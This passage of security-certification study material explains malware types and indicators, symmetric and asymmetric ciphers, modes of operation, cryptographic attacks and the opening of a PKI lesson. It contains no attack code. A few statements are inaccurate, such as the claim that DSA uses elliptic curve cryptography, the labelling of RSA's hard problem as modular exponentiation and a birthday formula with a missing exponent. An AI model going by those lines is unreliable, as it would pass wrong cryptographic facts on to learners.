The threat actor must establish a connection from the compromised host to a command and control (C2 or C&C) host or network. There are many means of implementing a C&C network as a covert channel to evade detection and filtering.


Rootkits

If malware can be delivered as the payload for an exploit of a severe vulnerability, it may be able to execute without requiring any authorization using SYSTEM privileges. Alternatively, the malware may be able to use an exploit to escalate privileges after installation. Malware running with this level of privilege is referred to as a rootkit. The term derives from UNIX/Linux where any process running as root has unrestricted access to everything from the root of the file system down.

\*\*Software processes can run in one of several “rings.” Ring 0 is the most privileged (it provides direct access to hardware) and so should be reserved for kernel processes only. Ring 3 is where user-mode processes run; drivers and I/O may run in Ring 1 or Ring 2. This architecture can also be complicated by the use of virtualization.\*\*

Ransomware, Crypto-Malware, and Logic Bombs

Ransomware is a type of malware that tries to extort money from the victim. One class of ransomware will display threatening messages, such as requiring Windows to be reactivated or suggesting that the computer has been locked by the police because it was used to view child pornography or for terrorism. This may apparently block access to the file system by installing a different shell program, but this sort of attack is usually relatively simple to fix.

The crypto-malware class of ransomware attempts to encrypt data files on any fixed, removable, and network drives. If the attack is successful, the user will be unable to access the files without obtaining the private encryption key which is held by the attacker. If successful, this sort of attack is extremely difficult to mitigate, unless the user has up to date backups of the encrypted files.

Ransomware uses payment methods, such as wire transfer, cryptocurrency, or premium rate phone lines, to allow the attacker to extort money without revealing his or her identity or being traced by local law enforcement.

Another type of crypto-malware hijacks the resources of the host to perform cryptocurrency mining. This is referred to as crypto-mining or cryptojacking. Cryptojacking is performed across botnets.

Some types of malware do not trigger automatically. Having infected a system, they wait for a pre-configured time or data (time bomb) or a system or user event (logic bomb). A logic bomb isn’t necessarily malicious code but could be an event that triggers an undesirable event.





Malware Indicators

Antivirus notifications

Most hosts should be running some type of antivirus (A-V) software. While the A-V moniker remains popular, these suites are better conceived of as endpoint protection platforms (EPPs) or next-gen A-V. These detect malware by signature regardless of type. though detection rates can vary quite widely from product to product. Many suites also integrate with user and entity behavior analytics (UEBA) and use AI-backed analysis to detect threat actor behavior that has bypassed malware signature matching.

Sandbox Execution

A sandbox is a system configured to be completely isolated from its host so that the malware cannot “break out.” The sandbox will be designed to record file system and registry changes plus network activity. Cuckoo is packaged software that aims to provide a turnkey sandbox solution.

Resource Consumption

Abnormal resource consumption can be detected using a performance monitor, Task Manager, or the top Linux utility. Indicators such as excessive and continuous CPU usage, memory leaks, disk read/write activity, and disk space usage can be signs of malware, but can also be caused by many other performance and system stability issues. 

File System

While fileless malware is prevalent, file system change or anomaly analysis is still necessary. Even if the malware code is not saved to disk, the malware is still likely to interact with the file system and registry, revealing its presence by behavior. A computer’s file system stores a great deal of useful metadata about when files were created, accessed, or modified. Analyzing these metadata and checking for suspicious temporary files can help you establish your timeline of events for an incident that has left traces on a host and its files.

Process Analysis

Threat hunting and security monitoring must use behavioral-based techniques to identify infections. This means close analysis of the processes running in system memory on a host. To perform abnormal process behavior analysis effectively, you should build up a sense of what is “normal” in a system and spot deviations in a potentially infected system. Sysinternals is a suite of tools designed to assist with troubleshooting issues with Windows, and many of the tools are suited to investigating security issues. The Sysinternals tool Process Explorer is an enhanced version of Task Manager.

Lesson 5: Summarizing Basic Cryptographic Concepts

Topic 5A: Compare and Contrast Cryptographic Ciphers

A cipher is the particular operation performed to encode or decode data. Modern cryptographic systems make use of symmetric and asymmetric cipher types to encode and decode data. As well as these cipher types, one-way hash functions have an important role to play in many security controls.

Cryptographic Concepts

Cryptography (literally meaning "secret writing") has been around for thousands of years. It is the art of making information secure by encoding it. This stands in opposition to the concept of security through obscurity. Security through obscurity means keeping something a secret by hiding it. This is generally acknowledged to be impossible (or at least, high risk) on any sort of computer network. With cryptography, it does not matter if third parties know of the existence of the secret, because they can never know what it is without obtaining an appropriate credential.

The following terminology is used to discuss cryptography: 

- Plaintext (or cleartext)—an unencrypted message. 
- Ciphertext—an encrypted message. 
- Cipher—the process (or algorithm) used to encrypt and decrypt a message. 
- Cryptanalysis—the art of cracking cryptographic systems. 

Hashing Algorithms

Hashing is the simplest type of cryptographic operation. A cryptographic hashing algorithm produces a fixed-length string from an input plaintext that can be of any length. The output can be referred to as a checksum, message digest, or hash. The function is designed so that it is impossible to recover the plaintext data from the digest (one-way) and so that different inputs are unlikely to produce the same output (a collision).


There are two popular implementations hash algorithms:

- Secure Hash Algorithm (SHA)—considered the strongest algorithm. There are variants that produce different-sized outputs, with longer digests considered more secure. The most popular variant is SHA-256, which produces a 256-bit digest.
- Message Digest Algorithm #5 (MD5)—produces a 128-bit digest. MD5 is not considered to be quite as safe for use as SHA-256, but it might be required for compatibility between security products.

Encryption Ciphers and Keys

While a hash function can be used to prove the integrity of data, it cannot be used to store or transmit data. The plaintext cannot be recovered from the digest. An encryption algorithm is a type of cryptographic process that encodes data so that it can be recovered, or decrypted. The use of a key with the encryption cipher ensures that decryption can only be performed by authorized persons.

Substitution and Transposition Ciphers

To understand how encryption works, it is helpful to consider simple substitution and transposition ciphers. A substitution cipher involves replacing units (a letter or blocks of letters) in the plaintext with different ciphertext. Simple substitution ciphers rotate or scramble letters of the alphabet. 

In contrast to substitution ciphers, the units in a transposition cipher stay the same in plaintext and ciphertext, but their order is changed, according to some mechanism. 

Keys and Secret Ciphers

Encryption ciphers use a key to increase the security of the process. For example, if you consider the Caesar cipher ROT13, you should realize that the key is 13. You could use 17 to achieve a different ciphertext from the same method. The key is important because it means that even if the cipher method is known, a message still cannot be decrypted without knowledge of the specific key. This is particularly important in modern cryptography. Attempting to hide details of the cipher (a secret algorithm) amounts to "security by obscurity." Modern ciphers are made stronger by being open to review (cryptanalysis) by third-party researchers.

Symmetric Encryption

A symmetric cipher is one in which encryption and decryption are both performed by the same secret key. The secret key is so-called because it must be kept secret. If the key is lost or stolen, the security is breached. Symmetric encryption is used for confidentiality. 

Symmetric encryption is also referred to as single key or private key or shared secret. Note that "private key" is also used to refer to part of the public key cryptography process, so take care not to confuse the two uses.

Stream and Block Ciphers

There are two types of symmetric encryption: stream ciphers and block ciphers.

Stream Ciphers

In a stream cipher, each byte or bit of data in the plaintext is encrypted one at a time. This is suitable for encrypting communications where the total length of the message is not known. The plaintext is combined with a separate randomly generated message, calculated from the key and an initialization vector (IV). The IV ensures the key produces a unique ciphertext from the same plaintext. The keystream must be unique, so an IV must not be reused with the same key. The recipient must be able to generate the same keystream as the sender and the streams must be synchronized. Stream ciphers might use markers to allow for synchronization and retransmission. Some types of stream ciphers are made self-synchronizing.

Block Ciphers

In a block cipher, the plaintext is divided into equal-size blocks (usually 128-bit). If there is not enough data in the plaintext, it is padded to the correct size using some string defined in the algorithm. For example, a 1200-bit plaintext would be padded with an extra 80 bits to fit into 10 x 128-bit blocks. Each block is then subjected to complex transposition and substitution operations, based on the value of the key used.

The Advanced Encryption Standard (AES) is the default symmetric encryption cipher for most products. Basic AES has a key size of 128 bits, but the most widely used variant is AES256, with a 256-bit key. 

Key Length

The range of key values available to use with a particular cipher is called the keyspace. The keyspace is roughly equivalent to two to the power of the size of the key. Using a longer key (256 bits rather than 128 bits, for instance) makes the encryption scheme stronger. You should realize that key lengths are not equivalent when comparing different algorithms, however. Recommendations on minimum key length for any given algorithm are made by identifying whether the algorithm is vulnerable to cryptanalysis techniques and by the length of time it would take to "brute force" the key, given current processing resources.

Asymmetric Encryption

In a symmetric encryption cipher, the same secret key is used to perform both encryption and decryption operations. With an asymmetric cipher, operations are performed by two different but related public and private keys in a key pair. 

Each key is capable of reversing the operation of its pair. For example, if the public key is used to encrypt a message, only the paired private key can decrypt the ciphertext produced. The public key cannot be used to decrypt the ciphertext, even though it was used to encrypt it. 

The keys are linked in such a way as to make it impossible to derive one from the other. This means that the key holder can distribute the public key to anyone he or she wants to receive secure messages from. No one else can use the public key to decrypt the messages; only the linked private key can do that.

Asymmetric encryption can be used to prove identity. The holder of a private key cannot be impersonated by anyone else. The drawback of asymmetric encryption is that it involves substantial computing overhead compared to symmetric encryption. The message cannot be larger than the key size. Where a large amount of data is being encrypted on disk or transported over a network, asymmetric encryption is inefficient.

Consequently, asymmetric encryption is mostly used for authentication and non-repudiation and for key agreement and exchange. Key agreement/exchange refers to settling on a secret symmetric key to use for bulk encryption without anyone else discovering it.

Public Key Cryptography Algorithms

Asymmetric encryption is often referred to as public key cryptography. Many public key cryptography products are based on the RSA algorithm. Ron Rivest, Adi Shamir, and Leonard Adleman published the RSA cipher in 1977 ([rsa.com](https://www.rsa.com/)). The RSA algorithm provides the mathematical properties for deriving key pairs and performing the encryption and decryption operations. This type of algorithm is called a trapdoor function, because it is easy to perform using the public key, but difficult to reverse without knowing the private key.

Elliptic curve cryptography (ECC) is another type of trapdoor function that can be used in public key cryptography ciphers. The principal advantage of ECC over RSA's algorithm is that there are no known "shortcuts" to cracking the cipher or the math that underpins it, regardless of key length. Consequently, ECC used with a key size of 256 bits is very approximately comparable to RSA with a key size of 2048 bits. 

RSA key pair security depends on the difficulty of finding the prime factors of very large integers (modular exponentiation). ECC depends on the discrete logarithm problem.




Topic 5B: Summarize Cryptographic Modes of Operation

A mode of operation is a means of using a cipher within a product to achieve a security goal, such as confidentiality or integrity.

Digital Signatures

Public key cryptography can authenticate a sender, because they control a private key that encrypts messages in a way that no one else can. Public key cryptography can only be used with very small messages, however. Hashing proves integrity by computing a unique checksum from input. These two cryptographic functions can be combined to authenticate a sender and prove the integrity of a message, with a digital signature.

It is important to remember that a digital signature is a hash that is then encrypted using a private key. Without the encryption, another party could easily intercept the file and the hash, modify the file and compute a new hash, and then send the modified file and hash to the recipient. It is also important to realize that the recipient must have some means of validating that the public key really was issued by Alice. Also note that digital signatures do not provide any message confidentiality.

The Digital Signature Algorithm (DSA) is a slightly different format for achieving the same sort of goal. DSA uses elliptic curve cryptography (ECC) rather than the RSA cipher.

Digital Envelopes and Key Exchange

Symmetric encryption is the only practical means of encrypting and decrypting large amounts of data (bulk encryption), but it is difficult to distribute the secret key securely. Public key cryptography makes it easy to distribute a key, but can only be used efficiently with small amounts of data. Therefore, both are used within the same product in a type of key exchange system known as a digital envelope or hybrid encryption. A digital envelope allows the sender and recipient to exchange a symmetric encryption key securely by using public key cryptography.

Note that in this process, it is the recipient's public key that is used to perform encryption and the recipient's private key that is used for decryption. The validity of the whole digital envelope can be proved using a message authentication code. 



Digital Certificates

When using public/private key pairs, a subject will make his or her public key freely available. This allows recipients of his or her messages to read the digital signature. Similarly, he or she uses the recipient's public key to encrypt a message via a digital envelope. This means that no one other than the intended recipient can read the message.

The question then arises of how anyone can trust the identity of the person or server issuing a public key. One solution is to have a third party, referred to as a certificate authority (CA), validate the owner of the public key by issuing the subject with a certificate. The certificate is signed by the CA. If the recipient also trusts the CA, they can also trust the public key wrapped in the subject's certificate. The process of issuing and verifying certificates is called public key infrastructure (PKI).

Perfect Forward Secrecy

This risk from RSA key exchange is mitigated by perfect forward secrecy (PFS). PFS uses Diffie-Hellman (DH) key agreement to create ephemeral session keys without using the server's private key. Diffie-Hellman allows Alice and Bob to derive the same shared secret just by agreeing some values that are all related by some trapdoor function. In the agreement process, they share some of them, but keep others private. Mallory cannot possibly learn the secret from the values that are exchanged publicly ([en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)). The authenticity of the values sent by the server is proved by using a digital signature.

PFS can be implemented using either the Diffie-Hellman Ephemeral mode (DHE or EDH) or Elliptic Curve Diffie-Hellman Ephemeral mode (ECDHE) algorithms. To use PFS, the server and client must negotiate use of a mutually supported cipher suite.

Cipher Suites and Modes of Operation

In a protocol such as Transport Layer Security (TLS), the requirements to both authenticate the identity of the server and to encrypt communications between the server and client need to be fulfilled by separate cryptographic products and cipher implementations. The combination of ciphers supported is referred to as a cipher suite. The server and client negotiate mutually compatible cipher suites as part of the TLS handshake.

So far, we have identified two parts of the cipher suite:

- A signature algorithm, used to assert the identity of the server's public key and facilitate authentication.
- A key exchange/agreement algorithm, used by the client and server to derive the same bulk encryption symmetric key.

The final part of a cipher suite determines the bulk encryption cipher. When AES is selected as the symmetric cipher, it has to be used in a mode of operation that supports a stream of network data.

Cipher Block Chaining (CBC) Mode

The Cipher Block Chaining (CBC) mode applies an initialization vector (IV) to the first plaintext block to ensure that the key produces a unique ciphertext from any given plaintext. The output of the first ciphertext block is then combined with the next plaintext block using an XOR operation. This process is repeated through the full "chain" of blocks, which (again) ensures that no plaintext block produces the same ciphertext. CBC needs to use padding to ensure that the data to encrypt is an exact multiple of the block size.

XOR is a logical operation that outputs 1 only when the inputs are 1 and 0.

Counter Mode

Counter mode (CTM) makes the AES algorithm work as a stream cipher. Counter mode applies an IV plus an incrementing counter value to the key to generate a keystream. The keystream is then XOR'ed to the data in the plaintext blocks. Each block can be processed individually and consequently in parallel, improving performance. Also, counter modes do not need to use padding. Any unused space in the last block is simply discarded.

Authenticated Modes of Operation

Symmetric algorithms do not provide message integrity or authentication. The basic CBC and counter modes of operation are unauthenticated. While a man-in-the-middle cannot decrypt them directly without the secret key, the ciphertexts are vulnerable to arbitrary data being inserted or modified to break the encryption scheme, referred to as a chosen ciphertext attack.

### Authenticated Encryption
A message authentication code (MAC) provides an authentication and integrity mechanism by hashing a combination of the message output and a shared secret key. The recipient can perform the same process using his or her copy of the secret key to verify the data. This type of authenticated encryption scheme is specified in a cipher suite as separate functions, such as "AES CBC with HMAC-SHA." Unfortunately, the implementation of this type of authenticated mode in AES CBC is vulnerable to a type of cryptographic attack called a padding oracle attack ([docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode)).
### Authenticated Encryption with Additional Data (AEAD)
The weaknesses of CBC arising from the padding mechanism means that stream ciphers or counter modes are strongly preferred. These use Authenticated Encryption with Additional Data (AEAD) modes of operation. In an AEAD scheme, the associated data allows the receiver to use the message header to ensure the payload has not been replayed from a different communication stream.

An AEAD mode is identified by a single hyphenated function name, such as AES-GCM or AES-CCM. The ChaCha20-Poly1305 stream cipher has been developed as an alternative to AES.

Topic 5C: Summarize Cryptographic Use Cases and Weaknesses

CRYPTOGRAPHY SUPPORTING AUTHENTICATION AND NON-REPUDIATION

A single hash function, symmetric cipher, or asymmetric cipher is called a cryptographic primitive. A complete cryptographic system or product is likely to use multiple cryptographic primitives, such as within a cipher suite. The properties of different symmetric/asymmetric/hash types and of specific ciphers for each type impose limitations on their use in different contexts and for different purposes.

If you are able to encrypt a message in a particular way, it follows that the recipient of the message knows with whom he or she is communicating (that is, the sender is authenticated). This means that encryption can form the basis of identification, authentication, and access control systems.

Authentication and non-repudiation depend on the recipient not being able to encrypt the message, or the recipient would be able to impersonate the sender. This means that to support authentication and non-repudiation, recipients must be able to use the cryptographic process to decrypt authentication and integrity data, but not to encrypt it. This use case is supported by asymmetric encryption ciphers and public/private key pairs.

To use a key pair, the user or server generates the linked keys. The private key is stored securely and protected from use by others by the account password. It is critical that only the user or server be able to use the private key. The public key is given to clients or correspondents, usually in the form of a digital certificate.

When the user or server needs to authenticate, it encrypts some agreed hashed data using the private key and sends it to the client as a digital signature. The client should be able to decrypt the signature using the public key and derive the same hash value.

CRYPTOGRAPHY SUPPORTING CONFIDENTIALITY

Cryptography removes the need to store or transfer messages over secure media. It does not matter if a ciphertext is stolen or intercepted because the threat actor will not be able to understand or change what has been stolen. This use of cryptography fulfils the goal of confidentiality. For this use case, you cannot simply use asymmetric encryption and private/public key pairs, because the algorithm cannot encrypt large amounts of data efficiently.

Therefore, bulk data encryption uses a symmetric cipher, such as AES. A symmetric cipher can encrypt and decrypt data files and streams of network traffic quickly. The problem is that distributing a symmetric key securely is challenging. The more people who know the key value, the weaker the confidentiality property is. The risks of a threat actor obtaining the key grow exponentially. Luckily, symmetric keys are only 128 bits or 256 bits long, and so can easily be encrypted using a public key. Consequently, most cryptographic systems use both symmetric and asymmetric encryption.

Encryption supporting confidentiality is used for both data-at-rest (file encryption) and data-in-transit (transport encryption):

- File encryption—the user is allocated an asymmetric cipher key pair. The private key is written to secure storage—often a trusted platform module (TPM)—and is only available when the user has authenticated to his or her account. The public key is used to encrypt a randomly generated AES cipher key. When the user tries to encrypt or decrypt files, the AES cipher key is decrypted using the private key to make it available for the encryption or decryption operation.
- Transport encryption—this uses either digital envelopes or perfect forward secrecy. For HTTPS, a web server is allocated a key pair and stores the private key securely. The public key is distributed to clients via a digital certificate. The client and server use the key pair to exchange or agree on one or more AES cipher keys to use as session keys. 

CRYPTOGRAPHY SUPPORTING INTEGRITY AND RESILIENCY

Integrity is proved by hashing algorithms, which allow two parties to derive the same checksum and show that a message or data has not been tampered with. A basic hash function can also be used with a shared secret to create a message authentication code (MAC), which prevents a man-in-the-middle tampering with the checksum.

A control system is one with multiple parts, such as sensors, workstations, and servers, and complex operating logic. A system is seen as resilient if, when a compromise of part of the system, does not allow the compromise of the whole system. Cryptography assists this goal by ensuring the authentication and integrity of messages delivered over the control system.

Integrity and resiliency are also an issue for computer code. If a threat actor has administrator privileges, they can change the operation of legitimate code to make it work as malware. A developer can make tampering more difficult using obfuscation. Obfuscation is the art of making a message difficult to understand. Obfuscated source code is rewritten in a way that does not affect the way the computer compiles or executes the code, but makes it difficult for a person reading the code to understand how it works. 

CRYPTOGRAPHIC PERFORMANCE LIMITATIONS 

Differences between ciphers make them more or less useful for resource-constrained environments. The main performance factors are as follows:

- Speed—for symmetric ciphers and hash functions, speed is the amount of data per second that can be processed. Asymmetric ciphers are measured by operations per second. Speed has the most impact when large amounts of data are processed.
- Time/latency—for some use cases, the time required to obtain a result is more important than a data rate. For example, when a secure protocol depends on ciphers in the handshake phase, no data transport can take place until the handshake is complete. This latency, measured in milliseconds, can be critical to performance.
- Size—the security of a cipher is strongly related to the size of the key, with longer keys providing better security. Note that the key size cannot be used to make comparisons between algorithms. For example, a 256-bit ECC key is stronger than a 2048-bit RSA key. Larger keys will increase the computational overhead for each operation, reducing speed and increasing latency.
- Computational overheads—in addition to key size selection, different ciphers have unique performance characteristics. Some ciphers require more CPU and memory resources than others, and are less suited to use in a resource-constrained environment.

In selecting a product or individual cipher for a particular use case, a tradeoff must be achieved between the demand for the best security available and the resources available for implementation.

- Low power devices—some technologies or ciphers configured with longer keys require more processing cycles and memory space. This makes them slower and means they consume more power. Consequently, some algorithms and key strengths are unsuitable for handheld devices and embedded systems, especially those that work on battery power. Another example is a contactless smart card, where the card only receives power from the reader and has fairly limited storage capacity, which affects the maximum key size supported.
- Low latency uses—this can impact protocol handshake setup times. A longer handshake will manifest as delay for the user, and could cause timeout issues with some applications. Also, if cryptography is deployed with a real time-sensitive channel, such as voice or video, the processing overhead on both the transmitter and receiver must be low enough not to impact the quality of the signal. 

CRYPTOGRAPHIC SECURITY LIMITATIONS

Resource constraints may require you to make a tradeoff between security and performance, but you cannot trade too far. 
### Entropy and Weak Keys
Entropy is a measure of disorder. A plaintext will usually exhibit low entropy as it represents a message in a human language or programming language or data structure. The plaintext must be ordered for it to be intelligible to a person, computer processor, or database. One of the requirements of a strong cryptographic algorithm is to produce a disordered ciphertext. Put another way, the ciphertext must exhibit a high level of entropy. If any elements of order from the plaintext persist, it will make the ciphertext vulnerable to cryptanalysis, and the algorithm can be shown to be weak.

A weak key is one that produces ciphertext that is lower entropy than it should be. If a key space contains weak keys, the technology using the cipher should prevent use of these keys. DES and RC4 are examples of algorithms known to have weak keys. The way a cipher is implemented in software may also lead to weak keys being used. 

A weak number generator leads to many published keys sharing a common factor. A cryptanalyst can test for the presence of these factors and derive the whole key much more easily. Consequently, the true random number generator (TRNG) or pseudo RNG (PRNG) module in the cryptographic implementation is critical to its strength.

### Predictability and Reuse
Predictability is a weakness in either the cipher operation or within particular key values that make a ciphertext lower entropy and vulnerable to cryptanalysis. Reuse of the same key within the same session can cause this type of weakness. The RC4 stream cipher and some chained block modes of operation are not as secure as other cipher modes, because they exhibit predictability. Often, it is necessary to use an additional random or pseudo-random value in conjunction with the cipher:

- Nonce—the principal characteristic of a nonce is that it is never reused ("number used once") within the same scope (that is, with the same key value). It could be a random or pseudo-random value, or it could be a counter value.
- Initialization vector (IV)—the principal characteristic of an IV is that it is random (or pseudo-random). There may also be a requirement that an IV not be reused (as with a nonce), but this is not the primary characteristic.
- Salt—this is also a random or pseudo-random number or string. The term salt is used specifically in conjunction with hashing password values.

LONGEVITY AND CRYPTOGRAPHIC ATTACKS 

Use of weak cipher suites and implementations can represent a critical vulnerability for an organization. It means that data that it is storing and processing may not be secure. It may also allow a malicious attacker to masquerade as it by creating spoofed digital certificates, causing huge reputational damage. 

In one sense, longevity is a measure of the confidence that people have in a given cipher. Cryptanalysis is undertaken on encryption systems with the purpose of trying to detect weaknesses. However, if weaknesses discovered in a particular cipher or the implementation of a cipher under research conditions lead to the deprecation of that algorithm, that does not necessarily mean that the system is immediately vulnerable in practice. 

RC4 and DES/3DES are already deprecated. RSA is seen as approaching the end of its usefulness, with ECC and other algorithms offering better security and performance characteristics ([thesslstore.com/blog/is-it-still-safe-to-use-rsa-encryption](https://www.thesslstore.com/blog/is-it-still-safe-to-use-rsa-encryption/)). MD5 and SHA-1 have known weaknesses, but are not necessarily unsecure if compatibility is an overriding concern.

In another sense, longevity is the consideration of how long data must be kept secure. If you assume that a ciphertext will be exposed at some point, how long must that ciphertext resist cryptanalysis?

There is always a tradeoff among security, cost, and interoperability. Malicious mathematical attacks are difficult to launch, and the chances of success against up-to-date, proven technologies and standards are remote. If a deprecated algorithm is in use, there is no need for panic, but there will be a need for a plan to closely monitor the affected systems and to transition to better technologies as quickly as is practical.

MAN-IN-THE-MIDDLE AND DOWNGRADE ATTACKS

Cryptographic attacks are used to try to intercept confidential data or to spoof cryptographic credentials, such as a digital certificate. Some of these attacks depend on capturing the communications between two parties. They do not break the cryptographic system but exploit vulnerabilities in the way it is used. A man-in-the-middle (MITM) attack is typically focused on public key cryptography.

This attack is prevented by using secure authentication of public keys, such as associating the keys with certificates.

A downgrade attack can be used to facilitate a man-in-the-middle attack by requesting that the server use a lower specification protocol with weaker ciphers and key lengths.

KEY STRETCHING AND SALTING

Entropy is a concern whenever a cryptographic system makes use of user-generated data, such as a password. Users tend to select low entropy passwords, because they are easier to remember. A couple of technologies try to compensate for this. 
### Key Stretching
Key stretching takes a key that's generated from a user password and repeatedly converts it to a longer and more random key. The initial key may be put through thousands of rounds of hashing. This might not be difficult for the attacker to replicate so it doesn't actually make the key stronger, but it slows the attack down, as the attacker has to do all this extra processing for each possible key value. Key stretching can be performed by using a particular software library to hash and save passwords when they are created. The Password-Based Key Derivation Function 2 (PBKDF2) is very widely used for this purpose, notably as part of Wi-Fi Protected Access (WPA).
### Salting
Passwords stored as hashes are vulnerable to brute force and dictionary attacks. A password hash cannot be decrypted; hash functions are one-way. However, an attacker can generate hashes to try to find a match for password hash captured from network traffic or password file. A brute force attack simply runs through every possible combination of letters, numbers, and symbols. A dictionary attack creates hashes of common words and phrases.

Both these attacks can be slowed down by adding a salt value when creating the hash, so you compute:

(salt + password) \* SHA = hash

The salt is not kept secret, because any system verifying the hash must know the value of the salt. It simply means that an attacker cannot use pre-computed tables of hashes. The hash values must be recompiled with the specific salt value for each password.

COLLISIONS AND THE BIRTHDAY ATTACK

A birthday attack is a type of brute force attack aimed at exploiting collisions in hash functions. A collision is where a function produces the same hash value for two different plaintexts. This type of attack can be used for the purpose of forging a digital signature. The attack works as follows:

1. The attacker creates a malicious document and a benign document that produce the same hash value. The attacker submits the benign document for signing by the target.
1. The attacker then removes the signature from the benign document and adds it to the malicious document, forging the target's signature.

The trick here is being able to create a malicious document that outputs the same hash as the benign document. The birthday paradox means that the computational time required to do this is less than might be expected. The birthday paradox asks how large must a group of people be so that the chance of two of them sharing a birthday is 50%. The answer is 23, but people who are not aware of the paradox often answer around 180 (365/2). The point is that the chances of someone sharing a particular birthday are small, but the chances of any two people sharing any birthday get better and better as you add more people: 1 – (365 \* (365 − 1) \* (365 – 2) ... \* (365 – (N − 1)))/365N.

To exploit the paradox, the attacker creates multiple malicious and benign documents, both featuring minor changes (punctuation, extra spaces, and so on). Depending on the length of the hash and the limits to the non-suspicious changes that can be introduced, if the attacker can generate sufficient variations, then the chance of matching hash outputs can be better than 50%.

This means that to protect against the birthday attack, encryption algorithms (keyed hash algorithm) must demonstrate collision avoidance (that is, to reduce the chance that different inputs will produce the same output). To exploit the birthday paradox, the attacker generally has to be able to manipulate both documents/messages, referred to as a chosen prefix attack ([sha-mbles.github.io](https://sha-mbles.github.io/)). The birthday paradox method has been used successfully to exploit collisions in the MD5 function to create fake digital certificates that appear to have been signed by a certificate authority in a trusted root chain ([trailofbits.files.wordpress.com/2012/06/flame-md5.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/flame-md5.pdf)).

Topic 5D: Summarize Other Cryptographic Technologies

QUANTUM AND POST-QUANTUM

Quantum refers to computers that use properties of quantum mechanics to significantly out-perform classical computers at certain tasks.
### Computing
A quantum computer performs processing on units called qubits (quantum bits). A qubit can be set to 0 or 1 or an indeterminate state called a superposition, where there is a probability of it being either 1 or 0. The likelihood can be balanced 50/50 or can be weighted either way. The power of quantum computing comes from the fact that qubits can be entangled. When the value of a qubit is read, it collapses to either 1 or 0, and all other entangled qubits collapse at the same time. The strength of this architecture is that a single operation can utilize huge numbers of state variables represented as qubits, while a classical computer's CPU must go through a read, execute, write cycle for each bit of memory. This makes quantum very well-suited to solving certain tasks, two of which are the factoring problem that underpins RSA encryption and the discrete logarithm problem that underpins ECC.
### Communications
While quantum computing could put the strength of current cryptographic ciphers at risk, it also has the promise of underpinning more secure cryptosystems. The properties of entanglement, superposition, and collapse suit the design of a tamper-evident communication system that would allow secure key agreement.
### Post-Quantum
Post-quantum refers to the expected state of computing when quantum computers that can perform useful tasks are a reality. Currently, the physical properties of qubits and entanglement make quantum computers very hard to scale up. At the time of writing, the most powerful quantum computers have about 50 qubits. A quantum computer will need about a million qubits to run useful applications.

More generally, cryptographic agility refers to an organization's ability to update the specific algorithms used across a range of security products without affecting the business workflows that those products support ([cryptosense.com/blog/achieving-crypto-agility](https://cryptosense.com/blog/achieving-crypto-agility/)).

### Lightweight Cryptography
Another problem affecting current cryptographic ciphers is use on low-power devices. NIST is hoping that a compact cipher suite will be developed that is both quantum resistant and that can run on battery-powered devices with minimal CPU and memory resources ([csrc.nist.gov/projects/lightweight-cryptography](https://csrc.nist.gov/projects/lightweight-cryptography)).

HOMOMORPHIC ENCRYPTION

Homomorphic encryption is principally used to share privacy-sensitive data sets. When a company collects private data, it is responsible for keeping the data secure and respecting the privacy rights of individual data subjects. Companies often want to use third parties to perform analysis, however. Sharing unencrypted data in this scenario is a significant risk. Homomorphic encryption is a solution for this use case because it allows the receiving company to perform statistical calculations on fields within the data while keeping the data set as a whole encrypted.

BLOCKCHAIN 

Blockchain is a concept in which an expanding list of transactional records is secured using cryptography. Each record is referred to as a block and is run through a hash function. The hash value of the previous block in the chain is added to the hash calculation of the next block in the chain. This ensures that each successive block is cryptographically linked. Each block validates the hash of the previous block, all the way through to the beginning of the chain, ensuring that each historical transaction has not been tampered with. In addition, each block typically includes a timestamp of one or more transactions, as well as the data involved in the transactions themselves. 

The blockchain is recorded in a public ledger. This ledger does not exist as an individual file on a single computer; rather, one of the most important characteristics of a blockchain is that it is decentralized. The ledger is distributed across a peer-to-peer (P2P) network in order to mitigate the risks associated with having a single point of failure or compromise. Blockchain users can therefore trust each other equally. Likewise, another defining quality of a blockchain is its openness—everyone has the same ability to view every transaction on a blockchain. 

Blockchain technology has a variety of potential applications. It can ensure the integrity and transparency of financial transactions, online voting systems, identity management systems, notarization, data storage, and more. However, blockchain is still an emerging technology, and outside of cryptocurrencies, has not yet been adopted on a wide-ranging scale.

STEGANOGRAPHY 

Steganography (literally meaning "hidden writing") is a technique for obscuring the presence of a message. Typically, information is embedded where you would not expect to find it; a message hidden in a picture, for instance. The container document or file is called the covertext. A steganography tool is software that either facilitates this or conversely that can be used to detect the presence of a hidden message within a covertext. 

When used to conceal information, steganography amounts to "security by obscurity," which is usually deprecated. However, a message can be encrypted by some mechanism before embedding it, providing confidentiality. The technology can also provide integrity or non-repudiation; for example, it could show that something was printed on a particular device at a particular time, which could demonstrate that it was genuine or a fake, depending on context.

Lesson 6: Implementing Public Key Infrastructure

Topic 6A: Implement Certificates and Certificate Authorities

A digital certificate is a public assertion of identity, validated by a certificate authority (CA). As well as asserting identity, certificates can be issued for different purposes, such as protecting web server communications or signing messages.

PUBLIC AND PRIVATE KEY USAGE 

Public key cryptography solves the problem of distributing encryption keys when you want to communicate securely with others or authenticate a message that you send to others.

- When you want others to send you confidential messages, you give them your public key to use to encrypt the message. The message can then only be decrypted by your private key, which you keep known only to yourself.
- When you want to authenticate yourself to others, you create a signature and sign it by encrypting the signature with your private key. You give others your public key to use to decrypt the signature. As only you know the private key, everyone can be assured that only you could have created the signature.

The basic problem with public key cryptography is that you may not really know with whom you are communicating. The system is vulnerable to man-in-the-middle attacks. This problem is particularly evident with e-commerce. How can you be sure that a shopping site or banking service is really maintained by whom it claims? The fact that the site is distributing public keys to secure communications is no guarantee of actual identity. How do you know that you are corresponding directly with the site using its certificate? How can you be sure there isn't a man-in-the-middle intercepting and modifying what you think the legitimate server is sending you?

Public key infrastructure (PKI) aims to prove that the owners of public keys are who they say they are. Under PKI, anyone issuing public keys should obtain a digital certificate. The validity of the certificate is guaranteed by a certificate authority (CA). The validity of the CA can be established using various models. 

CERTIFICATE AUTHORITIES

The certificate authority (CA) is the entity responsible for issuing and guaranteeing certificates. Private CAs can be set up within an organization for internal communications. Most network operating systems, including Windows Server, have certificate services. For public or business-to-business communications, however, the CA must be trusted by each party. Third-party CA services include IdenTrust, Digicert, Sectigo/Comodo, GoDaddy, and GlobalSign. The functions of a CA are as follows:

